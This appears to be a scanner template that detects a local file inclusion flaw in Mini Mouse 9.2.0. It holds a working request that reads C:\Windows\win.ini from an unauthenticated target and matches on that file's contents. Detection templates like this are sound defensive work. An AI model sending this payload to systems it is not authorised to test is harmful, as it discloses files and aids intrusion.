id: minimouse-lfi
name: Mini Mouse 9.2.0 - Local File Inclusion
severity: high
confidence: tentative
description: Mini Mouse 9.2.0 is vulnerable to local file inclusion because it allows remote unauthenticated attackers to
  include and disclose the content of locally stored files via the 'file' parameter.
reference: CWE-22
tags:
- lfi
- edb
- minimouse
- vuln
requests:
- method: GET
  path: /file=C:%5CWindows%5Cwin.ini
  matchers:
  - type: status
    status:
    - 200
  - type: body
    words:
    - bit app support
    - fonts
    - extensions
  condition: and
